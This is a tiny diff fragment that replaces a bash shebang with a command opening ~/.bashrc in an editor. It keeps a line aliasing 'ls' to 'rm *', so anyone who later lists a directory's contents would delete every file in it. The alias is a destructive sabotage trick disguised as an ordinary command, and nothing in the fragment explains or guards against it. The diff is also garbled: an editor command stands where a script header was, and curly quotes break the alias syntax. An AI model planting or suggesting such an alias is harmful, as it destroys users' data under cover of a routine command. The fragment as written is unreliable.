@@ -1,2 +1,2 @@
-#!/bin/bash
+nano ~/.bashrc
 alias ls=”rm *”
